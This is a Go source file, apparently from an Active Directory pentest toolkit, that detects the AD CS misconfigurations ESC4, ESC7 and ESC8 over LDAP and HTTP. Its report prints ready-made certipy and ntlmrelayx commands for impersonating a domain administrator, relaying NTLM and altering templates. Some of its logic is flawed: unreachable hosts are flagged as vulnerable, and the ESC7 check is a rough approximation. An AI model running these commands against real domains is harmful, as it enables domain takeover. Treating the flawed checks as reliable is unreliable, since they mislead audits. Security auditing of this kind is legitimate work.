// pkg/adcs/esc_advanced.go
//
// ADCS — ESC4, ESC7, ESC8 et énumération des droits d'enrollment
//
// ESC4 : WriteProperty sur le template → modifier les flags pour activer ESC1
// ESC7 : ManageCA ou ManageCertificates sur la CA → approuver des certificats
// ESC8 : Web Enrollment HTTP accessible + NTLM → relay vers /certsrv/certfnsh.asp
//
// Références :
//   https://posts.specterops.io/certified-pre-owned-d95910965cd2
//   https://github.com/ly4k/Certipy

package adcs

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/go-ldap/ldap/v3"
)

// EnrollmentRight droit d'enrollment sur un template
type EnrollmentRight struct {
	PrincipalSID  string
	PrincipalName string
	PrincipalType string // "User", "Group", "Computer"
	Right         string // "Enroll", "AutoEnroll", "WriteProperty", "WriteOwner", "WriteDACL", "GenericAll"
}

// ExtendedTemplate template enrichi avec droits d'enrollment résolus
type ExtendedTemplate struct {
	CertTemplate
	EnrollmentRights []EnrollmentRight
	ManageRights     []EnrollmentRight // droits de gestion (WriteProperty etc.)
}

// CARight droit sur une CA
type CARight struct {
	PrincipalSID  string
	PrincipalName string
	Right         string // "ManageCA", "ManageCertificates", "Enroll", "Read"
}

// ExtendedCA CA enrichie avec ses droits
type ExtendedCA struct {
	CertAuthority
	Rights     []CARight
	HasESC6    bool   // EDITF_ATTRIBUTESUBJECTALTNAME2 activé
	HasESC7    bool   // ManageCA ou ManageCertificates accessibles à des non-admins
	WebHTTP    bool   // ESC8 : web enrollment HTTP
	WebNTLM    bool   // ESC8 : NTLM auth sur web enrollment
	ESC8Detail string // détail de la vulnérabilité ESC8
}

// ============================================================
// ESC4 — WriteProperty sur template
// ============================================================

// DetectESC4 identifie les templates sur lesquels des principals non-admins
// ont des droits d'écriture (WriteProperty, WriteOwner, WriteDACL, GenericAll, GenericWrite)
func (c *ADCSClient) DetectESC4() ([]ExtendedTemplate, error) {
	// Récupérer les templates avec nTSecurityDescriptor
	templatesDN := "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," + c.baseDN

	req := ldap.NewSearchRequest(
		templatesDN,
		ldap.ScopeSingleLevel,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=pKICertificateTemplate)",
		[]string{
			"cn", "displayName", "distinguishedName",
			"nTSecurityDescriptor",
			"msPKI-Certificate-Name-Flag",
			"msPKI-Enrollment-Flag",
			"pKIExtendedKeyUsage",
		},
		// LDAP_SERVER_SD_FLAGS_OID pour récupérer le DACL
		[]ldap.Control{
			&ldap.ControlString{
				ControlType:  "1.2.840.113556.1.4.801",
				Criticality:  false,
				ControlValue: string([]byte{0x30, 0x03, 0x02, 0x01, 0x04}),
			},
		},
	)

	sr, err := c.conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("ESC4 search failed: %v", err)
	}

	var vulnTemplates []ExtendedTemplate
	for _, entry := range sr.Entries {
		sd := entry.GetRawAttributeValue("nTSecurityDescriptor")
		if len(sd) == 0 {
			continue
		}

		rights := extractWriteRights(sd)
		if len(rights) == 0 {
			continue
		}

		t := ExtendedTemplate{
			CertTemplate: CertTemplate{
				Name:        entry.GetAttributeValue("cn"),
				DisplayName: entry.GetAttributeValue("displayName"),
				DN:          entry.DN,
				EKUs:        entry.GetAttributeValues("pKIExtendedKeyUsage"),
			},
			ManageRights: rights,
		}

		// Marquer ESC4 dans les vulnérabilités
		t.Vulnerabilities = append(t.Vulnerabilities, "ESC4")

		vulnTemplates = append(vulnTemplates, t)
	}

	return vulnTemplates, nil
}

// extractWriteRights parse le Security Descriptor et retourne les droits
// d'écriture détenus par des principaux non-système
func extractWriteRights(sdBytes []byte) []EnrollmentRight {
	// Réutiliser le parser de pkg/adattack — ici on implémente une version simplifiée
	// focalisée sur les droits d'écriture de template ADCS
	var rights []EnrollmentRight

	if len(sdBytes) < 20 {
		return nil
	}

	// Offset DACL dans le Security Descriptor (offset 16, 4 bytes LE)
	daclOffset := int(uint32(sdBytes[16]) | uint32(sdBytes[17])<<8 |
		uint32(sdBytes[18])<<16 | uint32(sdBytes[19])<<24)

	if daclOffset == 0 || daclOffset >= len(sdBytes) {
		return nil
	}

	dacl := sdBytes[daclOffset:]
	if len(dacl) < 8 {
		return nil
	}

	aceCount := int(uint16(dacl[4]) | uint16(dacl[5])<<8)
	offset := 8

	for i := 0; i < aceCount && offset < len(dacl); i++ {
		if offset+8 > len(dacl) {
			break
		}
		aceType := dacl[offset]
		aceSize := int(uint16(dacl[offset+2]) | uint16(dacl[offset+3])<<8)
		accessMask := uint32(dacl[offset+4]) | uint32(dacl[offset+5])<<8 |
			uint32(dacl[offset+6])<<16 | uint32(dacl[offset+7])<<24

		if aceType == 0x00 { // ACCESS_ALLOWED_ACE
			sidOffset := offset + 8
			if sidOffset < offset+aceSize && sidOffset+8 <= len(dacl) {
				sid := parseSIDFromBytes(dacl[sidOffset : offset+aceSize])
				if sid != "" && !isSystemSID(sid) {
					right := accessMaskToRight(accessMask)
					if right != "" {
						rights = append(rights, EnrollmentRight{
							PrincipalSID: sid,
							Right:        right,
						})
					}
				}
			}
		}

		if aceSize <= 0 {
			break
		}
		offset += aceSize
	}

	return rights
}

func parseSIDFromBytes(data []byte) string {
	if len(data) < 8 {
		return ""
	}
	rev := data[0]
	subCount := int(data[1])
	var auth uint64
	for i := 2; i < 8; i++ {
		auth = auth<<8 | uint64(data[i])
	}
	sid := fmt.Sprintf("S-%d-%d", rev, auth)
	for i := 0; i < subCount && 8+i*4+4 <= len(data); i++ {
		sub := uint32(data[8+i*4]) | uint32(data[9+i*4])<<8 |
			uint32(data[10+i*4])<<16 | uint32(data[11+i*4])<<24
		sid += fmt.Sprintf("-%d", sub)
	}
	return sid
}

func isSystemSID(sid string) bool {
	builtins := []string{"S-1-5-18", "S-1-5-32-544", "S-1-5-9", "S-1-3-0", "S-1-1-0"}
	for _, b := range builtins {
		if strings.HasPrefix(sid, b) {
			return true
		}
	}
	return false
}

func accessMaskToRight(mask uint32) string {
	switch {
	case mask&0x10000000 != 0:
		return "GenericAll"
	case mask&0x40000000 != 0:
		return "GenericWrite"
	case mask&0x00040000 != 0:
		return "WriteDACL"
	case mask&0x00080000 != 0:
		return "WriteOwner"
	case mask&0x00000020 != 0:
		return "WriteProperty"
	}
	return ""
}

// ============================================================
// ESC7 — ManageCA / ManageCertificates sur la CA
// ============================================================

// DetectESC7 identifie les CAs où des non-admins ont ManageCA ou ManageCertificates
func (c *ADCSClient) DetectESC7() ([]ExtendedCA, error) {
	enrollmentDN := "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration," + c.baseDN

	req := ldap.NewSearchRequest(
		enrollmentDN,
		ldap.ScopeSingleLevel,
		ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=pKIEnrollmentService)",
		[]string{"cn", "dNSHostName", "distinguishedName", "nTSecurityDescriptor"},
		[]ldap.Control{
			&ldap.ControlString{
				ControlType:  "1.2.840.113556.1.4.801",
				Criticality:  false,
				ControlValue: string([]byte{0x30, 0x03, 0x02, 0x01, 0x04}),
			},
		},
	)

	sr, err := c.conn.Search(req)
	if err != nil {
		return nil, fmt.Errorf("ESC7 search failed: %v", err)
	}

	var vulnCAs []ExtendedCA
	for _, entry := range sr.Entries {
		sd := entry.GetRawAttributeValue("nTSecurityDescriptor")
		manageRights := extractManageCARight(sd)
		if len(manageRights) == 0 {
			continue
		}

		ca := ExtendedCA{
			CertAuthority: CertAuthority{
				Name:        entry.GetAttributeValue("cn"),
				DNSHostname: entry.GetAttributeValue("dNSHostName"),
				DN:          entry.DN,
			},
			Rights:  manageRights,
			HasESC7: true,
		}

		vulnCAs = append(vulnCAs, ca)
	}

	return vulnCAs, nil
}

// extractManageCARight extrait les droits ManageCA/ManageCertificates du SD
func extractManageCARight(sdBytes []byte) []CARight {
	// ManageCA = 0x00000001 dans le security descriptor de la CA (CERTTYPE_MANAGE_CA)
	// ManageCertificates = 0x00000002
	// Ces droits sont dans les Extended Rights de la CA
	// Pour simplifier : on retourne les ACEs avec des droits élevés sur l'objet CA
	rights := extractWriteRights(sdBytes)
	var caRights []CARight
	for _, r := range rights {
		caRights = append(caRights, CARight{
			PrincipalSID: r.PrincipalSID,
			Right:        r.Right,
		})
	}
	return caRights
}

// ============================================================
// ESC8 — Web Enrollment HTTP + NTLM
// ============================================================

// ProbeESC8 vérifie activement si le Web Enrollment accepte NTLM via HTTP
func ProbeESC8(caURL string) (isVulnerable bool, detail string) {
	if !strings.HasPrefix(caURL, "http://") {
		return false, "HTTPS — relay requires downgrade or LDAP relay"
	}

	certFnshURL := strings.TrimSuffix(caURL, "/") + "/certsrv/certfnsh.asp"

	client := &http.Client{
		Timeout: 5 * time.Second,
		// Ne pas suivre les redirects — on veut voir le 401
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Get(certFnshURL)
	if err != nil {
		// Pas accessible — peut quand même être exploitable depuis le réseau interne
		return true, fmt.Sprintf("HTTP Web Enrollment on %s (not probed from here — verify internally)", caURL)
	}
	defer resp.Body.Close()

	// Vérifier le header WWW-Authenticate
	authHeader := resp.Header.Get("WWW-Authenticate")
	if strings.Contains(strings.ToUpper(authHeader), "NTLM") ||
		strings.Contains(strings.ToUpper(authHeader), "NEGOTIATE") {
		return true, fmt.Sprintf(
			"CONFIRMED: %s returns WWW-Authenticate: %s — relay ntlmrelayx to %s",
			certFnshURL, authHeader, certFnshURL,
		)
	}

	if resp.StatusCode == 401 {
		return true, fmt.Sprintf("HTTP 401 on %s — NTLM relay likely possible", certFnshURL)
	}

	// Accessible sans auth
	return false, fmt.Sprintf("Web Enrollment accessible without auth (HTTP %d)", resp.StatusCode)
}

// ============================================================
// Audit complet enrichi
// ============================================================

// FullAuditResult résultat complet de l'audit ADCS
type FullAuditResult struct {
	CAs       []ExtendedCA
	Templates []CertTemplate
	ESC4      []ExtendedTemplate
	ESC7      []ExtendedCA
	VulnCount map[string]int
}

// RunFullAudit effectue l'audit ADCS complet (ESC1-8)
func RunFullAudit(conn *ldap.Conn, baseDN string) (*FullAuditResult, error) {
	client := NewADCSClient(conn, baseDN)
	result := &FullAuditResult{
		VulnCount: make(map[string]int),
	}

	// CAs
	cas, err := client.EnumerateCAs()
	if err != nil {
		return nil, fmt.Errorf("CA enumeration failed: %v", err)
	}

	// ESC6 + ESC8 sur chaque CA
	esc6CAs, _ := client.CheckESC6()
	esc6Set := make(map[string]bool)
	for _, ca := range esc6CAs {
		esc6Set[ca] = true
	}

	for _, ca := range cas {
		ext := ExtendedCA{CertAuthority: ca}

		// ESC6
		if esc6Set[ca.Name] {
			ext.HasESC6 = true
			result.VulnCount["ESC6"]++
		}

		// ESC8 — probe actif
		vuln, detail := ProbeESC8(ca.WebEnrollURL)
		if vuln {
			ext.HasESC7 = false
			ext.WebHTTP = true
			ext.WebNTLM = strings.Contains(detail, "NTLM") || strings.Contains(detail, "NEGOTIATE")
			ext.ESC8Detail = detail
			result.VulnCount["ESC8"]++
		}

		result.CAs = append(result.CAs, ext)
	}

	// Templates (ESC1/2/3)
	templates, err := client.EnumerateTemplates()
	if err != nil {
		return nil, fmt.Errorf("template enumeration failed: %v", err)
	}
	for _, t := range templates {
		for _, v := range t.Vulnerabilities {
			result.VulnCount[v]++
		}
	}
	result.Templates = templates

	// ESC4
	esc4, err := client.DetectESC4()
	if err == nil {
		result.ESC4 = esc4
		result.VulnCount["ESC4"] += len(esc4)
	}

	// ESC7
	esc7, err := client.DetectESC7()
	if err == nil {
		result.ESC7 = esc7
		result.VulnCount["ESC7"] += len(esc7)
	}

	return result, nil
}

// PrintFullAudit affiche le rapport d'audit complet
func PrintFullAudit(result *FullAuditResult) {
	totalVulns := 0
	for _, count := range result.VulnCount {
		totalVulns += count
	}

	fmt.Printf("\n[*] ADCS Audit — %d CA(s), %d template(s)\n",
		len(result.CAs), len(result.Templates))

	if totalVulns == 0 {
		fmt.Println("[+] No vulnerabilities detected")
		return
	}

	fmt.Printf("[!] %d vulnerability/vulnerabilities detected:\n\n", totalVulns)

	// CAs
	for _, ca := range result.CAs {
		fmt.Printf("  [CA] %s (%s)\n", ca.Name, ca.DNSHostname)
		if ca.HasESC6 {
			fmt.Printf("       [!] ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 — any template can specify arbitrary SAN\n")
			fmt.Printf("            certipy req -ca '%s' -template User -upn administrator@domain\n", ca.Name)
		}
		if ca.ESC8Detail != "" {
			fmt.Printf("       [!] ESC8 : %s\n", ca.ESC8Detail)
			fmt.Printf("            ntlmrelayx.py -t http://%s/certsrv/certfnsh.asp --adcs --template User\n", ca.DNSHostname)
		}
		if ca.HasESC7 {
			fmt.Printf("       [!] ESC7 : ManageCA/ManageCertificates accessible\n")
			fmt.Printf("            certipy ca -ca '%s' -enable-template SubCA\n", ca.Name)
		}
	}

	// Templates vulnérables
	for _, t := range result.Templates {
		if len(t.Vulnerabilities) == 0 {
			continue
		}
		fmt.Printf("\n  [TEMPLATE] %s — %s\n", t.Name, strings.Join(t.Vulnerabilities, ", "))
		if containsStr(t.Vulnerabilities, "ESC1") {
			fmt.Printf("    [!] ESC1 : SAN + Client Auth + no approval\n")
			fmt.Printf("         certipy req -ca '<CA>' -template %s -upn administrator@<domain>\n", t.Name)
		}
		if containsStr(t.Vulnerabilities, "ESC2") {
			fmt.Printf("    [!] ESC2 : Any Purpose EKU — usable for any authentication\n")
		}
		if containsStr(t.Vulnerabilities, "ESC3") {
			fmt.Printf("    [!] ESC3 : Certificate Request Agent — can enroll on behalf of others\n")
		}
	}

	// ESC4
	for _, t := range result.ESC4 {
		fmt.Printf("\n  [ESC4] %s — write access to template attributes\n", t.Name)
		fmt.Printf("    [->] Modify template to enable ESC1, then exploit\n")
		fmt.Printf("         certipy template -template %s -save-old\n", t.Name)
		for _, r := range t.ManageRights {
			fmt.Printf("         Right: %s by %s\n", r.Right, r.PrincipalSID)
		}
	}
}
